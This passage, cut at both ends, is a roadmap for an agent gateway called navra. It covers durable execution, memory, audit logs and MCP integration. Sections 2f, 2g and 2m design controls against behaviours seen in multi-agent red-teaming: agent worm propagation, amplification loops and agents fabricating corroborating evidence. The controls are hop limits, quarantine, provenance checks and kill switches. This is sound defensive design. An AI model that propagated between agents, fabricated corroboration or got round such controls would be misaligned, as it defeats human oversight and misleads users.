each agent gets its own database, no external infrastructure.
This maps cleanly to navra's existing SQLite usage.

**Effort**: 3-4 days. **Priority**: Medium-High.
**Acceptance**: Kill navra mid-flow, restart, flow resumes from
last checkpoint without re-running completed nodes. Non-idempotent
tool calls not repeated.

Reference: Google ADK pause/resume (2026-05), DBOS durable
execution, Inngest durable execution for AI agents.

#### 2e. Event log and snapshotting for durable execution ✅ (2026-05-26)

**Crate**: `navra-flow` (executor, new `event_log.rs`)

Upgrade 2d (SQLite checkpoint) with a full event-sourcing model
inspired by Google AX's distributed agent runtime:

- **Append-only event log**: Every DAG node transition, tool call,
  and result is appended to an ordered event log in SQLite. Events
  are sequence-numbered for connection recovery with backfill.
- **Snapshot after each node**: Persist DAG state (completed nodes,
  in-flight nodes, blackboard state, mailbox queues) as periodic
  snapshots. Resume from latest snapshot + replay events since.
- **Connection recovery**: If the SSE connection drops mid-flow,
  the client reconnects and receives backfill from the last
  acknowledged sequence number. No lost state.
- **Replay divergence mitigation**: Pin model version + prompt hash
  in each event. On replay, detect if the model or prompt changed
  and flag divergence rather than silently producing different
  results (arXiv 2605.20173 identified this as a fundamental
  challenge for event-sourced agent systems).
- **Actor uniformity**: Same event log guarantees for all actors
  in the DAG (agents, tools, sandboxes) — no special-casing.

This extends 2d (which only checkpoints node completion state)
with full event sourcing for audit, replay, and debugging.

**Effort**: 3-4 days (on top of 2d). **Priority**: High.
**Depends on**: 2d (SQLite checkpoint infrastructure).
**Acceptance**: Kill navra mid-flow, restart, flow resumes from
event log. Client reconnects and receives missed events. Replay
with different model version triggers divergence warning.

Reference: Google AX (github.com/google/ax), arXiv 2605.20173
(SDB formalization), DBOS durable execution.

#### 2f. Anti-propagation hop limits ✅ (2026-05-26)

**Crate**: `navra-flow` (executor, mesh)

Add configurable hop limits to DAG execution to prevent agent worm
propagation patterns discovered in Microsoft's 100+ agent sandbox
red-teaming:

- **Per-flow hop limit**: New `max_hops` field in flow YAML
  (default: 5). Counts the number of agent-to-agent transitions
  in a single execution path. Exceeding the limit aborts the path.
- **Propagation detection**: If an agent's output triggers tool
  calls in multiple downstream agents that weren't in the original
  DAG plan, flag as potential propagation event and log to audit.
- **Rate limiting**: Per-agent message rate limit on mailbox
  channels. Abnormal message volume (>10x baseline) triggers
  quarantine of the sending agent.
- **IFC extension**: navra's IFC taint tracking already prevents
  untainted data from flowing to tainted sinks. Extend to track
  "hop count" as a taint dimension — data that has transited N
  agents carries a hop taint that restricts further propagation.

**Effort**: 1-2 days. **Priority**: High.
**Acceptance**: DAG execution with hop_limit=3 aborts paths longer
than 3 agent transitions. Abnormal message volume triggers quarantine.

Reference: Microsoft "Red-teaming a network of agents" (2026-05).

#### 2g. Provenance headers for inter-agent messages ✅ (2026-05-26)

**Crate**: `navra-flow` (mesh, mailbox, blackboard)

Add provenance tracking to all inter-agent messages in navra-flow
to defend against amplification attacks:

- **Provenance chain**: Each message carries a provenance header
  listing all agents that contributed to its content (agent IDs +
  timestamps). When Agent B cites Agent A's claim, the provenance
  chain is visible.
- **Independence check**: An agent cannot upvote/verify claims from
  agents in the same delegation chain. Prevents fabricated
  corroboration (Microsoft red-teaming found 42 agents fabricating
  evidence in one experiment).
- **Circular reference detection**: If a message's provenance chain
  contains a cycle (A → B → C → A), flag as potential amplification
  loop.
- **Blackboard provenance**: Each blackboard entry includes
  `provenance: Vec<(AgentId, Timestamp)>`. Readers can see who
  contributed what.

**Effort**: 1-2 days. **Priority**: High.
**Acceptance**: Inter-agent messages carry provenance chains.
Circular provenance detected and logged.

Reference: Microsoft network-level red teaming (2026-05),
NIST AI RMF Playbook (2026-03 update).

#### 2h. Formalize Stochastic-Deterministic Boundary ✅ (2026-05-26)

**Crate**: `navra-flow` (executor, new `sdb.rs`)

Make the boundary between LLM output and tool execution a first-class
architectural primitive in DAG node transitions, inspired by the SDB
formalization paper (arXiv 2605.20173):

- **Four-part contract per DAG node transition**:
  - `Proposer`: The LLM that generates the action plan
  - `Verifier`: Validation mechanism (schema check, safety hook,
    mandate validator)
  - `Commit Step`: The point where the proposal becomes an action
    (tool execution)
  - `Reject Signal`: Failure path (retry, escalate, abort)
- **Explicit SDB in flow YAML**: Each task can specify its
  verification requirements:
  ```yaml
  tasks:
    - id: review
      verify: { schema: findings_schema, min_confidence: 0.7 }
  ```
- **Pattern mapping**: The paper catalogues 6 runtime patterns.
  navra-flow already implements Hierarchical Delegation (DAG),
  Shared State Machine (blackboard), and Supervisor+Gate (handoff
  routing). Formalizing the SDB makes these patterns explicit
  rather than implicit in the code.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: DAG node transitions have explicit verify step.
Invalid proposals are rejected before tool execution.

Reference: arXiv 2605.20173 (Runtime Architecture Patterns for
Production LLM Agents).

#### 2i. Trajectory branching / checkpoint forking ✅

**Crate**: `navra-flow` (executor, event_log)

Fork agent execution paths from checkpoints for evaluation or
A/B testing, inspired by Google AX:

- **Checkpoint**: Save full DAG state at any point (2d/2e).
- **Fork**: Create a new execution branch from a checkpoint.
  The original branch continues; the fork runs with different
  parameters (model, temperature, persona).
- **Compare**: After both branches complete, compare outputs
  (task success, token usage, trajectory efficiency).
- **Use cases**: (a) evaluate same task with different models from
  same starting point, (b) explore alternative approaches without
  losing progress, (c) automated A/B testing in eval.rs.

**Effort**: 2-3 days. **Priority**: Medium.
**Depends on**: 2e (event log).
**Acceptance**: Fork a flow mid-execution with different model,
both branches complete independently, outputs compared.

Reference: Google AX trajectory branching.

#### 2j. Self-verification gate for DAG nodes ✅

**Crate**: `navra-flow` (executor)

After a DAG node claims completion, run a verification step in a
clean context before proceeding to downstream nodes:

- **Verification hook**: New `PostCompletionHook` that spawns a
  lightweight verifier agent to confirm the node's output meets
  the task specification.
- **Clean context**: The verifier runs without access to the
  node's conversation history — it sees only the task spec and
  the claimed output. Prevents self-confirming reasoning loops.
- **Configurable per-task**: `verify: true` in flow YAML enables
  verification for individual tasks. Default: false (opt-in to
  avoid overhead on simple tasks).
- **Failure path**: If verification fails, the node is re-executed
  with the verifier's feedback injected (similar to back-edge
  behavior).

WebWright achieved 60.1% on Odysseys (previous SOTA 44.5%) with
this pattern. LangChain's PreCompletionChecklistMiddleware is
a simpler variant.

**Effort**: 1-2 days. **Priority**: Medium.
**Acceptance**: DAG node with `verify: true` is checked by
independent verifier before downstream nodes execute.

Reference: WebWright self-verification gate (Microsoft Research),
LangChain PreCompletionChecklistMiddleware.

#### 2k. Per-agent temperature in flow definitions ✅ (2026-05-26)

**Crate**: `navra-flow` (yaml loader, executor)

Add per-task `temperature` override in flow YAML definitions,
enabling the reasoning sandwich pattern within a single flow:

- **Flow YAML**: `temperature: 0.8` on individual tasks.
- **Role-based defaults**: Planning tasks default to low temperature
  (0.1-0.2), execution tasks to medium (0.2-0.4), creative/synthesis
  tasks to high (0.6-0.8).
- **Reasoning sandwich**: Validated across multiple sources —
  LangChain (53.9% → 66.5%), NVIDIA financial agents (0.8/0.0/0.5).
  Allocate high reasoning for planning and verification, low for
  deterministic execution.

**Effort**: 0.5-1 day. **Priority**: Medium.
**Acceptance**: Flow with three tasks uses different temperatures
per task. Planner at 0.1, executor at 0.0, synthesizer at 0.8.

Reference: LangChain harness engineering, NVIDIA financial signal
discovery multi-agent system.

#### 2l. Operator libraries as constrained tool vocabularies (NEW — tech watch 2026-05-25)

**Crate**: `navra-flow` (yaml loader)

For domain-specific flows, allow restricting the available tool set
to a named "operator library" — reducing hallucination of invalid
operations:

- **Operator library**: Named set of allowed operations defined in
  flow YAML: `operators: [numeric_mean, text_summary, search]`.
- **Enforcement**: Agent tool loop only exposes tools matching the
  operator library. Tool calls outside the library are rejected
  before execution.
- **Domain examples**: Financial analysis (66 structured operators),
  legal research (search_codes, analyze_article, syllogism),
  code review (file_read, git_diff, file_search).

**Effort**: 0.5-1 day. **Priority**: Low.
**Acceptance**: Flow with restricted operator library rejects
out-of-vocabulary tool calls.

Reference: NVIDIA financial signal discovery (2026-05-22).

#### 2m. Kill switch and circuit breaker for flows (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-flow` (executor.rs)

Add kill switch and circuit breaker patterns for flow orchestration
resilience. Inspired by Microsoft AGT Agent SRE:

- **Kill switch**: Immediate termination of a running flow and all
  its sub-agents. Triggered via MCP tool call or D-Bus signal.
  Different from existing hop limits (2f) which prevent propagation
  — kill switch stops everything now.
- **Circuit breaker**: Per-tool failure tracking with configurable
  thresholds. After N consecutive failures for a tool, the circuit
  opens and the flow skips/reroutes that tool for a cooldown period.
  Prevents cascading failures (OWASP ASI08).
- **SLO monitoring**: Track per-flow success rate and latency. Alert
  when SLO thresholds are breached. Wire into existing Prometheus
  metrics.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Kill switch terminates running flow within 1s.
Circuit breaker opens after 3 consecutive tool failures.

Reference: Microsoft AGT Agent SRE, OWASP ASI08 (Cascading Failures).

### Phase 3: Persistent memory (navra-memory)

**Goal**: Working memory that survives sessions, knowledge
distillation pipeline, case-based reasoning. Backed by SQLite.

New crate: `navra-memory` (**Status**: All phases complete —
WorkingMemory, KnowledgeStore, SqliteSessionBackend, distillation
pipeline with Markdown export, RRF retrieval (4 channels + vector
integration test), memory decay with exponential scoring, model-aware
compaction strategies, MCP memory tools, audit log storage.)

#### 3a. Session persistence ✅

- `SessionBackend` trait in navra-core, `SqliteSessionBackend`
  in navra-memory. Sessions survive server restarts.
- Wired in navra-server at `~/.local/share/navra/sessions.db`.
- No auto-expiry (sessions persist indefinitely to preserve context
  across long work sessions). `expire()` available for manual use.

#### 3b. Memory type classification and keyed supersession (design complete)

Classify memories into typed categories with distinct lifecycle
semantics, inspired by Cloudflare Agent Memory and the Memory
Transfer Learning paper (arXiv 2604.14004):

- **4 memory types**: Facts (keyed, supersede on update), Events
  (timestamped, append-only), Instructions (procedural, versioned),
  Insights (abstract behavioral principles, highest transfer value).
- **Keyed supersession**: Facts and Instructions use content-addressed
  keys (SHA-256). New versions supersede old ones in a version chain,
  preserving history but surfacing latest.
- **Abstraction over traces**: Store high-level Insights ("always
  validate patches before applying") rather than raw action
  trajectories. The MTL paper proves 431 abstract memories outperform
  5.8k raw traces, and raw trajectories cause negative transfer
  (domain-mismatched anchoring, false validation confidence).
- **Ingestion pipeline**: Content-addressed ID → parallel full+detail
  extraction → 8 verification checks → classification → async
  vectorization.

Reference: Cloudflare Agent Memory (2026-04-19), KAIST/NYU Memory
Transfer Learning (arXiv 2604.14004).

#### 3c. Multi-channel retrieval with RRF fusion ✅

Replace single-channel vector search with fused multi-channel
retrieval using Reciprocal Rank Fusion:

- **6 retrieval channels** (run in parallel):
  1. Full-text search (existing FTS5)
  2. Fact-key lookup (exact match on keyed facts)
  3. Raw message search (substring match on stored turns)
  4. Direct vector search (existing sqlite-vec)
  5. HyDE — Hypothetical Document Embedding (generate ideal answer,
     embed that, search for similar stored memories)
  6. Temporal retrieval — time-based filtering and recency weighting
     for queries with temporal cues ("this morning", "last week",
     "before the refactor"). Parse temporal expressions into time
     ranges, filter memories by timestamp, boost recency.
- **RRF fusion**: Merge ranked lists from all channels using
  `score = Σ 1/(k + rank_i)` with k=60. No per-channel weight
  tuning needed.
- **Temporal weighting**: When a query contains temporal expressions,
  the temporal channel gets elevated rank contribution in the RRF
  fusion (effectively k=30 instead of k=60 for temporal results).
- Top-N results after fusion feed into context.

Reference: Cloudflare Agent Memory RRF design (2026-04-19),
PersonaVLM temporal-aware retrieval (arXiv 2604.13074).

#### 3d. Knowledge distillation pipeline ✅

Port the 4-stage Knowledge Cultivation Pipeline from the original
Python prototype:

1. **Ingestion**: Load session transcripts + external corpus
   (with `manifest.yaml` authority levels)
2. **Synthesis**: AI extracts StructuredCase from conversation
   segments (goal, actions, outcome, lessons_learned)
3. **Reconciliation**: Deduplication, conflict resolution by
   authority level
4. **Forging & Review**: Human-in-the-loop approval before
   promotion to Tier 2b cases or Tier 3 skills

Port data models: StructuredCase, CaseContext, Action, CaseOutcome,
CaseMetadata, CaseSearchResult. Port extractors, reconcilers,
transcript parsers, session segmenters.

**Output format**: Distilled knowledge stored as plain Markdown
files with YAML frontmatter (type, name, description, source,
created_at). Directory hierarchy represents topic taxonomy.
User-editable, version-controllable, locally inspectable —
no proprietary database intermediation.

Reference: SemaClaw wiki-based knowledge infrastructure
(arXiv 2604.11548).

This is DIFFERENT from context compaction (Phase 1a). Compaction
is runtime context management. Distillation is offline knowledge
extraction — turning experience into reusable wisdom.

#### 3e. Memory decay and working memory management ✅

- Exponential decay for working memory turns:
  `effective = importance * e^(-decay * age) * freshness + relevance_boost`
- Auto-importance scoring on ingestion (domain keywords, length,
  query-token overlap)
- Deduplication via token-overlap similarity threshold (≥0.72)
- Configurable decay rate per agent/session

Reference: Baddeley's episodic buffer model, tech watch article
on context layers (2026-04-17).

#### 3f. Model-aware context compaction strategies ✅

Different models respond best to different compaction strategies.
Instead of a fixed approach, support multiple strategies with
adaptive selection:

- **3 candidate strategies**: Keep-Last-N, Summary, Discard-All
- **Model-aware defaults**: Configure preferred strategy per model
  backend (e.g., summary-heavy for DeepSeek, aggressive discard
  for GPT-class models).
- **Optional lookahead routing**: At compaction trigger points, run
  K=3 additional turns with each strategy in parallel, select the
  branch with best continuation quality. Trade token cost for
  precision.
- **Efficiency-precision decomposition**: Aggressive compaction
  hurts search efficiency but boosts terminal precision;
  conservative approaches do the opposite. Make this tradeoff
  configurable per flow/agent.

Reference: AgentSwing (Alibaba, arXiv 2603.27490). Their
probabilistic framework: Pass@1 = search_efficiency ×
terminal_precision.

#### 3g. Memory MCP tools ✅

- `memory_store`, `memory_query`, `memory_forget` MCP tools implemented
- Wired into main.rs module registration
- Remaining: agents auto-load relevant memory into context,
  semantic query caching (paraphrase detection, ~76% savings)

#### 3i. Multi-user/multi-agent memory scoping ✅

**Crate**: `navra-memory` (schema + query)

Add three-dimensional memory scoping inspired by Memori's data model
and validated by the agent memory landscape survey:

- **`entity_id`** (user/tenant): Isolates memory per human user.
  Bob's facts never leak into Alice's recall. Maps to the `obo`
  claim being added to capability tokens (Phase 9k).
- **`process_id`** (agent/role): Same user can maintain separate
  memory contexts per agent persona (e.g., "fitness-coach" vs
  "legal-analyst"). Maps to navra-cognitive persona names.
- **`session_id`**: Already exists. Scopes ephemeral conversation
  state.

Schema change: Add `entity_id TEXT` and `process_id TEXT` columns
to working memory and knowledge store tables. Index for fast
scoped retrieval. Backward compatible (NULL = unscoped, legacy
behavior).

Also add **temporal validity windows**:
- `valid_from TIMESTAMP` and `superseded_at TIMESTAMP` on knowledge
  entries. Enables temporal reasoning that gives Zep/Graphiti its
  22-point benchmark advantage over pure vector similarity.
- Query API: `memory_query` gains optional `as_of` parameter for
  point-in-time retrieval.

**Effort**: 2 days. **Priority**: Medium.
**Acceptance**: Two users querying the same navra instance get
isolated memory. Temporal query returns facts valid at a given time.

Reference: Memori (MemoriLabs), Zep/Graphiti temporal KG,
Memory for Autonomous LLM Agents survey (arXiv:2603.07670).

#### 3j. Trace-based memory extraction ✅

**Crate**: `navra-security` (new `memory_hook.rs`) +
`navra-memory` (consolidation)

navra's hook pipeline intercepts every tool call — exactly the
data that Memori captures for trace-based memory. Implement a
`MemoryExtractionHook` that distills tool-call patterns into
semantic facts:

- **Post-hook**: After each tool call, evaluate whether the
  call+result contains a memorable fact (user preference,
  project state, correction).
- **Batch extraction**: On session close, run a small ONNX model
  over the session's episodic turns to extract durable facts into
  the FTS5 knowledge store. Reuses existing in-process ONNX infra.
- **Contradiction detection**: On write, run NLI (DeBERTa-v3 ONNX,
  ~100M params) against existing facts. Contradictions supersede
  old facts (using temporal validity from 3i).
- **Memory decay integration**: Four-step consolidation pipeline
  (decay → contradiction → merge → synthesis) aligned with
  AIngram's approach and previous tech watch notes.

**Effort**: 3-4 days. **Priority**: Medium.
**Depends on**: 3i (scoping columns).
**Acceptance**: After a 10-tool-call session, ≥3 durable facts
extracted automatically. Contradicting facts supersede old ones.

Reference: Memori trace extraction, AIngram consolidation pipeline,
Memory survey (arXiv:2603.07670), sqlite-memory (SQLiteAI).

#### 3h. Structured audit log ✅ (gateway blackbox)

Every agent action must be recorded for debugging, compliance,
and legal audit. Without this, multi-agent failures are opaque
and AI decisions have no provenance.

**What to record per tool call:**
- `run_id`: UUID for the entire run (lead + all teammates)
- `agent_id`: which agent (lead, teammate name)
- `iteration`: which ReAct loop iteration
- `timestamp`: wall clock
- `tool_name`: which MCP tool was called
- `tool_args`: arguments passed (redacted for sensitive fields)
- `tool_result`: result returned (truncated to max 4K chars)
- `tool_duration_ms`: how long the call took
- `acl_decision`: allowed/denied/needs_approval
- `ifc_label`: data label after the call

**What to record per model call:**
- `model_name`: which model was used
- `input_tokens`, `output_tokens`: token usage
- `response_type`: "text", "tool_calls", "empty"
- `reasoning_text`: model's text output between tool calls
  (the decision trace — why it chose this tool)

**What to record per run:**
- `run_id`, `prompt`, `persona`, `model`
- `start_time`, `end_time`, `duration`
- `total_iterations`, `total_tokens`
- `teammates`: list of {name, model, persona, operations, tools}
- `final_report`: the synthesis text
- `exit_reason`: "completed", "max_iterations", "error"

**Storage:**
- SQLite table `audit_log` in WorkingMemory DB
- Indexed by `run_id`, `agent_id`, `timestamp`
- Queryable via MCP tool `audit_query` (filter by run, agent, tool)
- Retained indefinitely (no decay — audit logs are immutable)

**Implementation:**
- Add `AuditLog` struct to `navra-memory`
- `ToolLoopResult` gains `audit_entries: Vec<AuditEntry>`
- Tool loop records each call as it executes
- Demo prints audit summary alongside the report
- `audit_query` MCP tool for retrospective analysis

**Compliance value:**
- EU AI Act Article 14 (human oversight) requires decision traceability
- SOC2 CC6.1 requires audit trails for system operations
- ISO 42001 requires records of AI system decisions

**Why third**: Memory improves agent quality significantly but isn't
blocking — agents work without it, just less effectively.

#### 3k. Knowledge graph triple storage (NEW — tech watch 2026-05-25)

**Crate**: `navra-memory` (knowledge store)

Add a lightweight knowledge graph layer on top of KnowledgeStore
using entity-relationship triples, without requiring a full graph
database:

- **New table**: `memory_triples (subject_id TEXT, predicate TEXT,
  object_id TEXT, confidence REAL, source TEXT)` linking
  `memory_knowledge` entries.
- **Triple extraction**: During memory extraction
  (`MemoryExtractionHook`), extract `(subject, predicate, object)`
  triples alongside flat memories. Uses the existing distillation
  LLM call with an extended prompt.
- **Entity clustering**: Merge semantically equivalent entities
  (e.g., "Rust ownership" vs "Rust's ownership model") during
  extraction using embedding similarity. The content-key based
  supersession handles exact duplicates but not semantic duplicates.
- **Graph queries**: New `memory_graph_query` tool for traversal
  queries ("what entities relate to X?", "find path between A
  and B"). Implemented as recursive SQL CTEs on the triples table.
- **NetworkX-style analytics**: Degree centrality, betweenness,
  community detection on the triple graph for knowledge structure
  visualization.

**Effort**: 2-3 days. **Priority**: Low-Medium.
**Depends on**: 3j (MemoryExtractionHook).
**Acceptance**: After a 10-tool-call session, triples are extracted
and queryable via graph traversal.

Reference: kg-gen (Stanford STAIR Lab, NeurIPS '25), Google Codelabs
Gemini KG generation.

#### 3l. Temporal tree memory on SQLite (MemForest architecture) ✅ (2026-05-29)

**Crate**: `navra-memory` (new `temporal.rs`)

Implement MemForest-style hierarchical temporal indexing directly
on SQLite — the architecture, not the product. No external dependency
needed. Uses the same SQLite + sqlite-vec storage navra-memory
already has.

**Schema** — three SQLite tables (session_tree, entity_tree, scene_tree):
```sql
CREATE TABLE memory_tree_{type} (
    id INTEGER PRIMARY KEY,
    parent_id INTEGER REFERENCES memory_tree_{type}(id),
    depth INTEGER NOT NULL,       -- 0 = root, max = leaf
    time_start INTEGER NOT NULL,  -- unix epoch
    time_end INTEGER NOT NULL,
    summary TEXT,                  -- LLM-generated for internal nodes
    content TEXT,                  -- raw fact for leaves
    dirty INTEGER DEFAULT 0,      -- ancestor-path refresh needed
    embedding BLOB                -- for vector search at any level
);
```

- **Writes**: Insert leaf at depth=max, mark ancestor path dirty.
  O(log N) per write — only the path from leaf to root is touched.
- **Dirty-path refresh**: Background task coalesces dirty nodes at
  same level, regenerates summaries lazily. Batches reduce LLM calls.
- **Two-phase retrieval**: Forest Recall (search root summaries via
  FTS5 + embedding) → Tree Browse (descend matching trees to leaves
  via embedding similarity at each level).
- **Three tree types**: Session (chronological), Entity (recurring
  subjects keyed by entity name), Scene (multi-entity interactions).

Augments existing FTS5 + sqlite-vec + RRF. The temporal trees add
a hierarchical index on top — not a replacement.

**Effort**: 7-10 days. **Priority**: Medium.
**Acceptance**: Temporal queries ("what did we discuss about X last
week?") return relevant results via tree descent. Write throughput
improves over flat sequential inserts.

Reference: MemForest (arXiv:2605.23986, architecture only).

### Phase 4: Mandate validation & failure recovery ✓

**Status**: Done.

Implemented in `navra-flow`:

- Mandate validator: keyword + success_criteria matching with
  scoring (0-100), expected_output length check
- Failure classifier: categorizes agent_error, validation_failed,
  max_iterations, circular_fix
- Attempt history: tracks error/output per attempt
- Circular fix detector: pattern detection across attempts
- Recovery strategies: RetryWithContext, Skip, Abort
- Back-edges: conditional re-execution when validation fails
  (replaces rigid retry with graph-level feedback loops)

### Phase 5: Ecosystem integration

#### 5a. ACP transport (skeleton ✅, prompt streaming TODO)

Add Agent Client Protocol support to navra-server:

- ACP is JSON-RPC 2.0 over Streamable HTTP (single `POST /acp`
  endpoint) — same transport as MCP, different method set.
- Methods: `initialize`, `authenticate`, `session/new`,
  `session/load`, `session/prompt` (streaming responses).
- Enables navra agents to appear in Zed and JetBrains IDEs
  without building editor plugins.
- Reuses existing Axum HTTP infrastructure from navra-server.

Reference: ACP spec (github.com/i-am-bee/acp), Goose's
goose-acp crate, JetBrains AI Assistant ACP support.

#### 5b. MCP permission negotiation (NEW — AAIF contribution)

Design and implement a permission negotiation extension for MCP:

- New MCP method: `permissions/request` — an MCP server can request
  elevated permissions from the client (e.g., write access to a path).
- Client-side: present permission request to user, relay decision
  back to server via `permissions/grant` / `permissions/deny`.
- Server-side (navra): update ACLs dynamically based on granted
  permissions. Scoped to session, with optional persistence.
- Integrate with Goose's approval model: when Goose is the client,
  its permission prompt maps to `permissions/request`.
- Propose as MCP specification extension to AAIF.

This bridges the gap between Goose's UI-level permission prompts
and navra's infrastructure-level ACLs.

#### 5c. Goose-as-frontend integration ✅ (docs + config examples)

Enable Goose desktop app to connect to navra as a single MCP
extension over Streamable HTTP:

- navra already speaks MCP over HTTP — Goose can connect today.
- Build a Goose extension config snippet and test end-to-end:
  Goose UI → navra gateway → downstream tools with full
  auth/ACL/IFC/safety.
- Document the setup for users.
- Capture feedback on: permission flow UX, latency, tool
  discovery, error messages.
- Stretch: build a Goose deeplink (`goose://extension?...`)
  for one-click navra installation.

#### 5d. LLM backend expansion (NEW)

Add missing model backends to navra-model:

| Backend | Transport | Priority |
|---------|-----------|----------|
| **BedockBackend** | AWS SDK (SigV4 auth) | High (enterprise) |
| **SageMakerBackend** | AWS SDK (custom endpoint) | High (enterprise) |
| **MistralBackend** | Mistral API (separate format) | Medium |
| **CliBackend** | Subprocess stdio | Medium |

**CliBackend architecture:**
- Spawn CLI as subprocess: `Command::new("gemini").args(...)`.
- Pipe prompt via stdin or args, capture stdout as response.
- Supports: `claude` (Claude Code), `gemini` (Gemini CLI),
  `codex` (OpenAI Codex), `goose`, any custom CLI command.
- Optional Podman isolation: `--network=none` container wrapping
  the CLI subprocess (reuses navra-model-runtime isolation).
- Config: `cli_command`, `cli_args_template`, `isolation: "none" |
  "podman"`, `timeout_secs`.

This enables meta-agent orchestration — an agent can delegate to
another agent runtime as a "model backend."

#### 5e. AG-UI via rendra-ag-ui (updated 2026-05-29)

AG-UI event translation from navra MCP events to the rendra-ag-ui
widget. The rendering stack is already built:

- **rendra** — Servo-based desktop runtime (Electron alternative)
- **rendra-ui** — CSS + JS widget library (25 components, `rd-*`)
- **rendra-ag-ui** — AG-UI protocol widget (architecture designed,
  adapter/processor/store/renderer pipeline)

navra's role is emitting the right AG-UI events. The event flow:

```
navra hook pipeline → AG-UI events → rendra IPC → rendra-ag-ui
```

- **Event types**: Map MCP tool calls to AG-UI `ToolCallStart`/
  `ToolCallEnd`. Map approval requests (9ac) to AG-UI
  `ConfirmationRequest`. Map safety warnings to AG-UI `Message`.
- **Adapter**: navra-core emits AG-UI events via `notify_session()`.
  rendra-ag-ui's transport adapter consumes them via IPC bridge.
- **No web UI needed**: rendra-ag-ui renders directly in the desktop
  app. No React, no browser dependency.

**Effort**: 2-3 days (navra side — event translation layer).
**Priority**: Medium.
**Depends on**: 9ac (approval gate events), rendra-ag-ui adapter
  implementation (separate repo).
**Acceptance**: Tool call in navra renders as AG-UI activity in
  rendra-ag-ui widget. Approval request renders as confirmation
  dialog.

Reference: rendra-ag-ui (smgglrs-ai/rendra-ag-ui), AG-UI protocol
(docs.ag-ui.com).

#### 5f. Registry proxy module (NEW)

Add a `RegistryModule` to navra that aggregates external agent/tool
discovery registries behind the gateway's unified security layer:

- **Proxy to external registries**: AWS Agent Registry, Azure Agent
  Registry, MCP Registry — agents behind navra get unified discovery
  without needing provider-specific SDK access.
- **Registry as MCP server**: Expose discovery as MCP tools
  (`registry_search`, `registry_list`, `registry_describe`).
- **Hybrid search**: Forward keyword + semantic queries to upstream
  registries, merge results, apply navra's ACLs to filter what the
  requesting agent is allowed to discover.
- **Caching**: Cache registry responses locally with configurable
  TTL (default 1h). Avoid hammering external APIs.
- **Multilingual awareness**: Test non-English semantic search
  quality (AWS registry fails 33% of Japanese queries). Use local
  embedding model as fallback for non-English queries.

This fits the gateway pattern — navra aggregates discovery sources
just like it aggregates upstream MCP servers.

Reference: AWS Agent Registry (InfoQ, 2026-04-20), DISCOVERY.md.

#### 5g. Multi-agent cross-validation in flows (NEW)

Add cross-validation pattern to navra-flow for high-stakes
agent outputs:

- After an agent produces a result, spawn N verifier agents in
  parallel to independently assess the output.
- Verifiers flag issues with severity ranking; only surface
  findings that survive cross-validation (consensus or
  majority agreement).
- Anti-hallucination: agents validate each other's claims before
  surfacing to user. Claude Code Review achieves <1% false
  positive rate with this pattern.
- Configurable per-task: `verification: { agents: 2, threshold: "majority" }`

Reference: Claude Code Review multi-agent architecture
(claude.com/blog/code-review, 2026-04-19).

#### 5h. Upstream prompt injection into agent system prompt (NEW)

Upstream MCP servers can expose domain-specific prompts via
`prompts/list` and `prompts/get`. These prompts contain critical
instructions for how the agent should use the upstream's tools
(methodology, constraints, output format). Currently, upstream
prompts are discovered and proxied but **never injected into the
agent's system prompt** — the cognitive weaver only assembles from
persona YAML (directives + mandate + heuristics + examples).

This gap was discovered during Syllogis integration: the legal
analysis upstream exposes a `legal_analysis` prompt that instructs
the agent to "use search_codes to find real articles, follow this
methodology: extract facts → search → syllogism → conclusion."
Without this prompt, the agent (using the generic "leader" persona)
ignored the Syllogis tools and hallucinated article numbers from
its training data.

**Design**: Add an `mcp_prompts` field to the persona YAML schema:

```yaml
persona_name: legal_analyst
core_mandate: "Analyze French administrative law cases..."
heuristics:
  - module: french_admin_law
    facets: [principles, codes]
mcp_prompts:
  - upstream: syllogis
    prompt: legal_analysis
    inject_position: after_mandate
    arguments:
      case_description: "{{ input }}"
  - upstream: syllogis
    prompt: legal_syllogism
    inject_position: after_heuristics
```

**Weaver changes** (`build_cacheable_prefix()`):

1. Accept an optional MCP client (or prompt resolver function)
   alongside the ForgeService
2. After assembling directives + mandate, check for `mcp_prompts`
3. For each entry, call `prompts/get` on the named upstream
   with the specified arguments (template variables like
   `{{ input }}` resolved from the user prompt)
4. Insert the returned messages at the specified position:
   - `before_mandate`: before core_mandate
   - `after_mandate`: after core_mandate, before heuristics
   - `after_heuristics`: after heuristics, before examples
   - `after_examples`: at the end of the system prompt
5. Cache the assembled result (upstream prompts are typically
   static for a given set of arguments)

**CLI extension**: Also support ad-hoc upstream prompt injection
without modifying persona YAML:

```bash
navra run "Analyze this case..." \
  --persona legal_analyst \
  --upstream-prompt syllogis:legal_analysis
```

This fetches the prompt at runtime and appends it after the
persona's system prompt.

**Why this matters**: Upstream servers are domain experts. Their
prompts encode domain methodology that the persona YAML shouldn't
duplicate. A legal analysis persona shouldn't hardcode "use
search_codes" — that coupling belongs in the upstream's prompt.
This separation lets the same persona work with different upstreams
(e.g., a legal analyst persona could work with Syllogis for French
law or a different upstream for German law, each providing their
own methodology prompt).

**Implementation priority**: Medium. The CLI `--upstream-prompt`
flag is a 1-hour change in `main.rs run_agent()`. The YAML schema
+ weaver integration is a half-day change across navra-cognitive
and navra-agent.

**Discovered via**: Syllogis legal workbench integration
(2026-04-24). The agent had 40 tools available (6 from Syllogis)
but never called the Syllogis tools because its system prompt
(generic "leader" persona) contained no instructions to do so.

#### 5i. Module trait taxonomy review (NEW)

Review whether navra-core's flat `Module` trait should be split
into a richer taxonomy, inspired by SemaClaw's 4-layer plugin
architecture:

| Layer | SemaClaw | navra equivalent | Example |
|-------|----------|-----------------|---------|
| **Action** | MCP Tools | Tool modules (docs, git) | `navra-tools-*` |
| **Thought** | Subagents | Cognitive specializations | `navra-cognitive` |
| **Context** | Skills (lazy-loaded) | Context injectors (RAG, memory) | `navra-rag`, `navra-memory` |
| **Harness** | Lifecycle hooks | Hook pipeline, safety filters | `navra-security` |

Currently all modules implement the same `Module` trait regardless
of their role. Distinguishing tool-providers from context-injectors
from lifecycle hooks could improve composability and make the
architecture self-documenting.

**Decision needed**: Is the added type complexity worth it, or is
the flat trait + convention sufficient? Evaluate when implementing
Phase 3 (memory as context injector vs memory as tool).

Reference: SemaClaw 4-layer plugin taxonomy (arXiv 2604.11548).

#### 5j. Event-driven agent triggers ✅

**Crate**: `navra-server` (new `triggers/` module)

Add push-triggered agent activation for Voice assistant. Agents
currently only activate on explicit MCP requests (pull model).
Event triggers start agent flows when external events occur:

- **Email trigger**: IMAP IDLE on configured mailboxes. On new
